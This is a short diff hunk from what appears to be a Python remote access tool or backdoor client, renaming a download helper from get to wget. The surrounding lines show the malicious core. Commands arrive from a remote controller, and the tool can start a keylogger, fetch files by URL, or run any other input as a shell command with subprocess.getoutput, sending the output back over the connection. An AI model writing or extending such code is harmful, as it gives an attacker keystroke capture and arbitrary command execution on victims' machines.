@@ -124,9 +124,9 @@ def main():
 			keylogger.record()
 		elif cmd == "wget":
 			if len(args) == 1:
-				Download.get(args[0])
+				Download.wget(args[0])
 			elif len(args) == 2:
-				Download.get(args[0], args[1])
+				Download.wget(args[0], args[1])
 		else:
 			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
